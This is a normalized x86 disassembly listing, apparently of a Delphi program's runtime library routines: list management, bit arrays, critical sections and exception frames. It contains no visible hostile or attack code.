xor ecx ecx
mov edx esi
mov eax ebx
call sub_418950
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] ebp
sub_418a20
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_418860
cmp esi [ ebx + 0x8 ]
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov [ edx + esi * 4 ] edi
test eax eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov eax [ edx + esi * 4 ]
cmp edi eax
je r-xdata
test edi edi
je r-xdata
mov cl 0x2
mov edx eax
mov eax ebx
mov esi [ eax ]
call [ esi + 0x4 ]
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_418a70
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_418930
mov esi eax
test esi esi
jl r-xdata
mov eax esi
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_4187c4
sub_418a90
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_418860
cmp esi 0x7ffffff
jle r-xdata
pop esi
pop ebx
retn
mov edx esi
shl edx 0x2
lea eax [ ebx + 0x4 ]
call sub_40270c
mov [ ebx + 0xc ] esi
cmp esi [ ebx + 0xc ]
je r-xdata
sub_418acc
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_418860
cmp esi 0x7ffffff
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_418a90
cmp esi [ ebx + 0xc ]
jle r-xdata
mov ebp eax
dec ebp
mov edi esi
sub edi ebp
jg r-xdata
mov edx [ ebx + 0x4 ]
lea edx [ edx + eax * 4 ]
mov ecx esi
sub ecx eax
mov eax ecx
shl eax 0x2
xor ecx ecx
xchg edx eax
call sub_402cbc
jmp r-xdata
mov [ ebx + 0x8 ] esi
pop ebp
pop edi
pop esi
pop ebx
retn
dec edi
mov edx ebp
mov eax ebx
call sub_4187c4
dec ebp
inc edi
jne r-xdata
sub_418b3c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor esi esi
mov edx edi
mov eax ebx
call sub_418930
test eax eax
jl r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
mov esi edi
mov edx [ ebx + 0x4 ]
xor ecx ecx
mov [ edx + eax * 4 ] ecx
mov edx eax
mov eax ebx
call sub_4187c4
mov cl 0x1
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_418b7c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403278
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ esi + 0x4 ] eax
mov [ esi + 0x20 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_418bd0
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_403674
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_418cd4
xor eax eax
push ebp
push sub_418c32
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4032a8
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_403298
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418c39
mov eax [ ebp - 0x4 ]
call sub_418d38
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call DeleteCriticalSection
retn
sub_418c4c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_418cd4
xor eax eax
push ebp
push sub_418cc8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_418778
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_418930
inc eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418ccf
mov eax [ ebp - 0x4 ]
call sub_418d38
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x2
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax ]
mov ecx ebx
call sub_418860
sub_418ce8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_418cd4
xor eax eax
push ebp
push sub_418d2b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_418a70
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418d32
mov eax [ ebp - 0x4 ]
call sub_418d38
retn
sub_418d44
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_418d98
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403298
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_418d98
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x4 ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jge r-xdata
lea eax [ esi + 0x20 ]
dec eax
test eax eax
jns r-xdata
mov eax ebx
call sub_418d74
sar eax 0x5
mov edi eax
shl edi 0x2
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
add eax 0x1f
sar eax 0x5
mov ebp eax
shl ebp 0x2
cmp ebp edi
je r-xdata
add eax 0x1f
mov [ ebx + 0x4 ] esi
xor eax eax
mov [ esp ] eax
test edi edi
je r-xdata
test ebp ebp
je r-xdata
mov eax edi
call sub_4026cc
mov [ esp ] eax
mov eax [ esp ]
xor ecx ecx
mov edx edi
call sub_402cbc
mov eax [ esp ]
mov [ ebx + 0x8 ] eax
cmp [ esp ] 0x0
je r-xdata
mov edx ebp
mov eax [ ebx + 0x8 ]
call sub_4026ec
mov edx edi
mov eax ebp
call sub_418d8c
mov ecx eax
mov edx [ esp ]
mov eax [ ebx + 0x8 ]
call sub_4028c8
sub_418e3c
cmp edx [ eax + 0x4 ]
jae r-xdata
cmp edx 0x0
jl sub_418d74
mov eax [ eax + 0x8 ]
or cl cl
je r-xdata
push eax
push edx
push ecx
inc edx
call sub_418d98
pop ecx
pop edx
pop eax
jmp r-xdata
btr [ eax ] edx
retn
bts [ eax ] edx
retn
sub_418e80
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
sar eax 0x5
dec eax
test eax eax
jl r-xdata
add eax 0x1f
mov eax [ ebx + 0x4 ]
inc eax
mov [ esp ] eax
xor esi esi
inc esi
dec [ esp ]
jne r-xdata
mov eax [ ebx + 0x8 ]
mov edi [ eax + esi * 4 ]
xor eax eax
mov eax [ ebx + 0x8 ]
mov edx [ r-xdata ]
cmp edx [ eax + esi * 4 ]
je r-xdata
jb r-xdata
and edx 0x7f
bt edi edx
inc eax
cmp al 0x20
jne r-xdata
mov edx esi
shl edx 0x5
and eax 0x7f
add edx eax
mov eax edx
mov edx [ ebx + 0x4 ]
cmp eax edx
jl r-xdata
mov edx eax
cmp dl 0x1f
ja r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax edx
jmp r-xdata
sub_418ef8
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax esi
call sub_41c08c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403298
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_418f38
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_418fee
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4040d0
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_4031f8
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_40429c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_4031f8
lea eax [ ebp - 0x104 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0x4
lea eax [ ebp - 0x114 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac8
call sub_403a74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418ff5
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_419014
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4190a9
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_4031f8
lea edx [ ebp - 0x104 ]
mov eax edi
call sub_40429c
mov eax ebx
mov si 0xffff
call sub_4034a4
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4190b0
lea eax [ ebp - 0x4 ]
call sub_404038
retn
mov eax ebx
mov si 0xffff
call sub_4034a4
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_4034a4
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ edi ]
mov eax edi
mov edx 0x3
call sub_4043b8
sub_4190bb
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebx ] dh
rol bl 0x90
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4034fc
mov eax ebx
mov si 0xffff
call sub_4034a4
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffff
call sub_4034a4
push eax
lea eax [ ebx + 0x4 ]
call sub_405934
mov ecx eax
mov edx r-xdata
pop eax
call sub_40335c
sub_419118
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
pop ebp
retn 0x4
sub_419138
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
jmp r-xdata
pop ebp
retn 0x4
sub_419158
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_40335c
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_419180
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
je r-xdata
mov eax edi
call sub_405934
test ebx ebx
je r-xdata
xor eax eax
mov [ edi ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax ebx
mov si 0xffff
call sub_4034a4
mov esi eax
test esi esi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax edi
call sub_405934
mov edx eax
mov eax esi
call sub_419180
test [ ebx + 0x1c ] 0x10
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax edi
call sub_405934
push eax
push r-xdata
push ebx
mov eax [ ebx ]
call [ eax + 0x28 ]
jmp r-xdata
sub_419218
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_41926d
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_405934
mov edx eax
mov eax edi
call sub_419180
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419274
lea eax [ ebp - 0x4 ]
call sub_405934
retn
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_41927c
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403278
mov [ edi + 0x4 ] esi
mov eax [ ebp + 0x8 ]
mov [ edi + 0x8 ] eax
mov eax edi
call sub_419318
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_4192cc
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov eax esi
call sub_419308
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403298
test bl bl
jle r-xdata
mov edx [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_41932c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx ecx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_419364
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418ef8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_419394
push esi
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
pop esi
retn
cmp [ esi + 0xc ] 0x0
jne r-xdata
test dl dl
je r-xdata
mov edx eax
xor edx edx
jmp r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x1c ]
sub_4193d0
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax [ ebx ]
call sub_4031f8
mov edx esp
mov eax esi
call sub_40429c
add esp 0x100
pop esi
pop ebx
retn
sub_4193f8
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_41948d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x4 ] 0x0
je r-xdata
lea edx [ ebp - 0x114 ]
mov eax [ ebx ]
call sub_4031f8
lea edx [ ebp - 0x114 ]
mov eax edi
call sub_40429c
push edi
lea edx [ ebp - 0x14 ]
mov eax [ ebx + 0x4 ]
mov si 0xfffe
call sub_4034a4
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
mov eax ebx
call sub_4193b8
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_40911c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419494
lea eax [ ebp - 0x14 ]
call sub_404038
retn
sub_4194b0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_4199cc
mov edx ebx
mov eax esi
call sub_419964
sub_4194e0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4193b8
test eax eax
jl r-xdata
pop esi
pop ebx
retn
cmp esi eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
mov ecx esi
xchg edx eax
call sub_4189c8
mov dl 0x1
mov eax ebx
call sub_419394
sub_419510
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ esi + 0x8 ] eax
xor ecx ecx
mov edx esi
mov eax esi
call sub_419218
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_41955c
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov [ esi + 0xc ] 0x1
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov cl 0x1
mov edx esi
mov eax esi
call sub_419218
mov eax [ esi + 0x8 ]
call sub_4032a8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418ef8
test bl bl
jle r-xdata
mov eax esi
call sub_419674
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_4195a8
push ebx
push ecx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ ebx + 0x4 ]
call [ eax + 0x1c ]
mov [ esp ] eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ esp ]
pop edx
pop ebx
retn
sub_4195c8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_418f24
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_419646
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_419674
mov eax esi
call sub_419748
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
inc ebx
xor edi edi
mov edx edi
mov eax esi
call sub_419750
push eax
mov eax [ ebp - 0x4 ]
call sub_4195a8
pop edx
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc edi
dec ebx
jne r-xdata
sub_419674
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_4196ce
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
cmp [ ebx + 0x8 ] 0x0
jg r-xdata
mov eax ebx
call sub_4189bc
call sub_4032a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
sub_4196e8
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
inc ebx
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x8 ]
mov edx esi
call sub_4188d4
cmp ebp [ eax + 0x8 ]
je r-xdata
sub_419728
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
mov edx esi
mov eax ebx
call sub_419750
mov edx [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
pop esi
pop ebx
pop ebp
retn 0x4
sub_419764
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_419812
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x108 ]
mov eax [ ebx ]
call sub_4031f8
lea edx [ ebp - 0x108 ]
mov eax edi
call sub_40429c
mov eax ebx
mov si 0xffff
call sub_4034a4
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419819
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40405c
retn
mov eax ebx
mov si 0xffff
call sub_4034a4
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_4034a4
cmp [ ebp - 0x4 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_41982c
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0x8 ]
mov eax edi
mov edx 0x3
call sub_4043b8
sub_41982c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
call sub_40408c
mov eax [ ebp - 0x4 ]
mov si 0xffff
call sub_4034a4
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_4034e8
test eax eax
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_4034e8
call sub_414b1c
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebx + 0x8 ] 0x0
je r-xdata
movsx eax [ ebx + 0x8 ]
shl eax 0x2
call sub_4026cc
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_419929
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_4034e8
mov edx [ ebp - 0xc ]
call sub_414d20
movsx edi [ ebx + 0x8 ]
dec edi
test edi edi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4026ec
retn
inc edi
xor ebx ebx
inc ebx
dec edi
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + ebx * 4 ]
mov eax [ ebp - 0x10 ]
call sub_414da4
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0xc ]
mov esi [ eax + ebx * 4 ]
mov eax [ esi ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x14
lea edx [ esi + 0x1a ]
call sub_40429c
sub_419948
push ebx
push esi
mov esi edx
call sub_4195a8
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax ebx
pop esi
pop ebx
retn
sub_419964
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_403434
test al al
jne r-xdata
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_418778
mov [ esi + 0x4 ] ebx
mov eax [ ebx + 0x10 ]
mov [ esi + 0x8 ] eax
inc [ ebx + 0x10 ]
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor ecx ecx
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov eax ebx
call sub_419664
xor ecx ecx
mov edx esi
mov eax ebx
call sub_419218
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
xor ecx ecx
mov eax [ r-xdata ]
call sub_418860
sub_4199cc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov cl 0x1
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov eax [ ebx + 0x8 ]
call sub_4189bc
cmp esi eax
jne r-xdata
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_418a70
mov eax [ ebx + 0x8 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_4187c4
jmp r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
mov cl 0x1
mov edx esi
mov eax ebx
call sub_419218
mov eax ebx
call sub_419664
pop edi
pop esi
pop ebx
retn
sub_419a28
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_4188d4
mov edx eax
mov cl 0x2
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_4188d4
call sub_4032a8
pop edi
pop esi
pop ebx
retn
sub_419a6c
push ecx
mov [ esp ] edx
sub cl 0x1
jb r-xdata
mov edx esp
mov ecx [ eax ]
call [ ecx + 0xc ]
pop edx
retn
dec cl
je r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
pop edx
retn
sub_419a90
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x18 ] ecx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov eax esi
call sub_419510
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_419ad8
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41a798
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418ef8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_419b08
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_419b2c
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov esi eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_419b50
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419bf7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_419ca0
xor eax eax
push ebp
push sub_419bda
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419be1
mov eax [ ebp - 0x4 ]
call sub_419d5c
retn
inc esi
xor ebx ebx
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xc ]
push eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_419c08
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_418f24
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_419ca0
xor eax eax
push ebp
push sub_419c88
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov esi ebx
mov al [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] al
mov al [ esi + 0x7 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x7 ] al
mov al [ esi + 0x6 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x6 ] al
mov al [ esi + 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
